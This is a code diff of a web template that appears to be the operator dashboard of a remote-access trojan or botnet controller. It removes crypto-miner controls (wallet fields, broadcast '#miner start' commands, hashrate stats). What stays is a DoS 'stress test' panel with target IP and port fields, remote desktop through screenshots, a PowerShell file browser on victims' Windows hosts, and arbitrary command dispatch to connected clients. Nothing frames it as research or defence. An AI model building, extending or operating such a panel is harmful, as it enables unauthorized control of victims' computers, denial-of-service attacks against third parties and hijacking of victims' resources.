@@ -100,13 +100,7 @@
         
         <div class="global-control-panel">
             <h3 style="font-size: 0.6rem; color: var(--accent); margin: 0 0 8px 0;">NETWORK BROADCAST</h3>
-            <input type="text" id="global-miner-wallet" placeholder="Broadcast Wallet Address" class="meta-input" style="margin-bottom: 8px; font-size: 0.7rem;">
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 5px;">
-                <button class="btn-primary" onclick="broadcastMining('start')" style="font-size: 0.7rem;">Start All</button>
-                <button class="btn-danger" onclick="broadcastMining('stop')" style="font-size: 0.7rem;">Kill All</button>
-            </div>
-            
-            <div style="margin-top: 15px; border-top: 1px solid var(--border); padding-top: 10px;">
+            <div>
                 <input type="text" id="broadcast-stress-ip" placeholder="Target IP" class="meta-input" style="font-size: 0.7rem; margin-bottom: 5px;">
                 <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 5px;">
                     <input type="number" id="broadcast-stress-port" placeholder="Port" value="80" class="meta-input" style="font-size: 0.7rem;">
@@ -130,14 +124,6 @@
 
         <div class="stats-bar">
             <div class="stat-item">
-                <span class="stat-label">Network Hashrate</span>
-                <span class="stat-value" id="net-hashrate">0.00 H/s</span>
-            </div>
-            <div class="stat-item">
-                <span class="stat-label">Total Shares</span>
-                <span class="stat-value" id="net-shares">0</span>
-            </div>
-            <div class="stat-item">
                 <span class="stat-label">Active Workers</span>
                 <span class="stat-value" id="net-workers">0</span>
             </div>
@@ -150,7 +136,6 @@
             <button class="tab-btn" onclick="switchTab('tab-identity')">Identity</button>
         </div>
 
-        <!-- CONSOLE -->
         <div id="tab-terminal" class="content-area active">
             <div style="display: flex; gap: 1rem; height: 100%;">
                 <div style="flex: 2; display: flex; flex-direction: column;">
@@ -165,19 +150,10 @@
                         <img id="screenshot-image" style="width:100%; border: 1px solid var(--border); cursor: pointer; background:#000;" onclick="enterControlMode()">
                         <button class="btn-primary" style="width:100%; margin-top:10px" onclick="enterControlMode()">Remote Desktop</button>
                     </div>
-                    <div class="quick-tool-card">
-                        <h4>Node Intel</h4>
-                        <div style="font-family: 'JetBrains Mono'; font-size: 0.8rem; line-height: 1.8;">
-                            Mining: <span id="node-stat-mining" style="color:var(--accent)">Null</span><br>
-                            Rate: <span id="node-stat-rate" style="color:var(--accent)">0 H/s</span><br>
-                            Shares: <span id="node-stat-shares" style="color:var(--accent)">0</span>
-                        </div>
-                    </div>
                 </div>
             </div>
         </div>
 
-        <!-- FILE EXPLORER -->
         <div id="tab-files" class="content-area">
             <div class="file-browser">
                 <div class="file-header">
@@ -188,17 +164,8 @@
             </div>
         </div>
 
-        <!-- TOOLS TAB -->
         <div id="tab-tools" class="content-area">
             <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem;">
-                <div class="quick-tool-card">
-                    <h4>Crypto Miner</h4>
-                    <input type="text" id="miner-wallet" placeholder="Wallet Address" class="meta-input">
-                    <div style="margin-top: 1rem; display: flex; gap: 10px;">
-                        <button class="btn-primary" onclick="runMiner('start')">Start</button>
-                        <button class="btn-danger" onclick="runMiner('stop')">Stop</button>
-                    </div>
-                </div>
                 <div class="quick-tool-card">
                     <h4>Broadcast Stress Test (DoS)</h4>
                     <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
@@ -242,45 +209,8 @@
     let commandHistory = {};
     let clientStates = {}; 
 
-    const HASH_REGEX = /Hashrate:\s+([\d\.]+)\s+H\/s\s+\|\s+Shares:\s+(\d+)/;
-    const STALE_MS = 10000; 
     const DIR_JSON_MARKER = '##DIR_JSON##';
     const MICROBIN_URL_BASE = 'https://microbin.elaptic.dev/';
-
-    // COOKIE HELPERS
-    function setCookie(name, value, days = 365) {
-        const d = new Date();
-        d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
-        document.cookie = `${name}=${value};expires=${d.toUTCString()};path=/`;
-    }
-
-    function getCookie(name) {
-        const nameEQ = name + "=";
-        const ca = document.cookie.split(';');
-        for (let i = 0; i < ca.length; i++) {
-            let c = ca[i];
-            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
-            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
-        }
-        return "";
-    }
-
-    // Initialize wallet from cookies
-    const savedWallet = getCookie("erratic_wallet");
-    if (savedWallet) {
-        document.getElementById('global-miner-wallet').value = savedWallet;
-        document.getElementById('miner-wallet').value = savedWallet;
-    }
-
-    // Save wallet to cookies on change
-    ['global-miner-wallet', 'miner-wallet'].forEach(id => {
-        document.getElementById(id).addEventListener('input', (e) => {
-            const val = e.target.value;
-            setCookie("erratic_wallet", val);
-            document.getElementById('global-miner-wallet').value = val;
-            document.getElementById('miner-wallet').value = val;
-        });
-    });
 
     function switchTab(tabId) {
         document.querySelectorAll('.content-area').forEach(c => c.classList.remove('active'));
@@ -298,14 +228,11 @@
         clients.sort((a, b) => (a.online === b.online) ? 0 : a.online ? -1 : 1);
 
         clients.forEach(client => {
-            const state = clientStates[client.hostname] || { hashrate: 0, lastSeen: 0 };
-            const isMining = (Date.now() - state.lastSeen) < STALE_MS && state.hashrate > 0;
             const div = document.createElement('div');
             div.className = `client-card ${client.online ? 'online' : 'offline'} ${(current_client_hostname === client.hostname) ? 'selected' : ''}`;
             div.innerHTML = `
                 <div style="display:flex; justify-content:space-between; align-items:center;">
                     <div style="font-weight:600; font-size:0.85rem;"><span class="status-dot"></span>${client.alias || client.hostname}</div>
-                    ${isMining ? `<span style="font-size:0.6rem; color:red; font-family:monospace;">${Math.floor(state.hashrate)} H/s</span>` : ''}
                 </div>
             `;
             if (client.online) div.onclick = () => selectClient(client);
@@ -323,18 +250,6 @@
             return;
         }
 
-        const match = data.output.match(HASH_REGEX);
-        if (match) {
-            const rate = parseFloat(match[1]);
-            const shares = parseInt(match[2]);
-            if (!clientStates[targetClient.hostname]) clientStates[targetClient.hostname] = {};
-            clientStates[targetClient.hostname].hashrate = rate;
-            clientStates[targetClient.hostname].shares = shares;
-            clientStates[targetClient.hostname].lastSeen = Date.now();
-            updateGlobalStats();
-            if (data.client_id === current_client_id) refreshMiningUI();
-        }
-
         if (!commandHistory[targetClient.hostname]) commandHistory[targetClient.hostname] = "";
         commandHistory[targetClient.hostname] += data.output;
         if (data.client_id === current_client_id) {
@@ -344,12 +259,10 @@
         }
     });
 
-    /* FILE EXPLORER FIX */
     function refreshFiles() {
         if (!current_client_id || !current_client_hostname) return;
-        // Ensure state exists before reading path
         if (!clientStates[current_client_hostname]) {
-            clientStates[current_client_hostname] = { currentPath: "C:\\", hashrate: 0, lastSeen: 0, shares: 0 };
+            clientStates[current_client_hostname] = { currentPath: "C:\\" };
         }
         const path = clientStates[current_client_hostname].currentPath || "C:\\";
         const cmd = `powershell -Command "$p='${path.replace(/'/g, "''")}'; if(Test-Path $p){ $items = Get-ChildItem -Path $p | Select-Object Name, @{Name='IsDirectory';Expression={$_.PSIsContainer}}, @{Name='Size';Expression={$_.Length}}; echo '${DIR_JSON_MARKER}' (ConvertTo-Json -InputObject $items) } else { echo '${DIR_JSON_MARKER} []' }"`;
@@ -393,7 +306,6 @@
         socket.emit('command', { 'command': cmd, 'client_id': current_client_id });
     }
 
-    /* REMOTE DESKTOP */
     function enterControlMode() {
         if (!current_client_id) return;
         isControlMode = true;
@@ -412,17 +324,6 @@
 
     window.addEventListener('keydown', (e) => { if (e.key === 'Escape' && isControlMode) { isControlMode = false; document.getElementById('control-overlay').style.display = 'none'; socket.emit('command', { 'command': '#scrsht 1000', 'client_id': current_client_id }); } });
     socket.on('screenshot_data', (data) => { if (data.client_id === current_client_id) { const s = "data:image/jpeg;base64," + data.image_data; document.getElementById('screenshot-image').src = s; if (isControlMode) document.getElementById('control-image').src = s; } });
-
-    /* TOOLS & BROADCAST */
-    function broadcastMining(action) {
-        const wallet = document.getElementById('global-miner-wallet').value || "WORKER";
-        allConnectedClients.forEach(c => { if(c.online) socket.emit('command', { command: `#miner ${action} 50 ${wallet}`, client_id: c.id }); });
-    }
-
-    function runMiner(action) {
-        const wallet = document.getElementById('miner-wallet').value || "WORKER";
-        socket.emit('command', { command: `#miner ${action} 50 ${wallet}`, client_id: current_client_id });
-    }
 
     function broadcastStress() {
         const host = document.getElementById('broadcast-stress-ip').value;
@@ -459,14 +360,12 @@
         });
     });
 
-    /* HELPERS */
     function selectClient(client) {
         current_client_id = client.id; current_client_hostname = client.hostname;
-        if (!clientStates[current_client_hostname]) clientStates[current_client_hostname] = { currentPath: "C:\\", hashrate: 0, lastSeen: 0, shares: 0 };
+        if (!clientStates[current_client_hostname]) clientStates[current_client_hostname] = { currentPath: "C:\\" };
         document.getElementById('node-title').textContent = (client.alias || client.hostname).toUpperCase();
         document.getElementById('command-output').textContent = commandHistory[client.hostname] || "Connected.\n";
         if (client.screenshot_data) document.getElementById('screenshot-image').src = "data:image/jpeg;base64," + client.screenshot_data;
-        refreshMiningUI();
     }
 
     function sendCommand() {
@@ -475,27 +374,13 @@
     }
 
     function updateGlobalStats() {
-        let h = 0, s = 0, w = 0, now = Date.now();
-        allConnectedClients.forEach(c => {
-            const st = clientStates[c.hostname];
-            if (st && (now - st.lastSeen) < STALE_MS) { h += st.hashrate; s += st.shares; if (st.hashrate > 0) w++; }
-        });
-        document.getElementById('net-hashrate').textContent = h.toLocaleString() + " H/s";
-        document.getElementById('net-shares').textContent = s;
+        let w = 0;
+        allConnectedClients.forEach(c => { if (c.online) w++; });
         document.getElementById('net-workers').textContent = w;
     }
 
-    function refreshMiningUI() {
-        if (!current_client_hostname || !clientStates[current_client_hostname]) return;
-        const st = clientStates[current_client_hostname];
-        const m = st && (Date.now() - st.lastSeen) < STALE_MS && st.hashrate > 0;
-        document.getElementById('node-stat-mining').textContent = m ? "ACTIVE" : "Null";
-        document.getElementById('node-stat-rate').textContent = m ? st.hashrate.toLocaleString() + " H/s" : "0 H/s";
-        document.getElementById('node-stat-shares').textContent = st ? st.shares : "0";
-    }
-
     function saveMetadata() { socket.emit('update_metadata', { hostname: current_client_hostname, alias: document.getElementById('edit-alias').value, description: document.getElementById('edit-desc').value }); }
-    setInterval(() => { updateGlobalStats(); if (current_client_id) refreshMiningUI(); }, 2000);
+    setInterval(() => { updateGlobalStats(); }, 2000);
     {% endraw %}
 </script>
 </body>
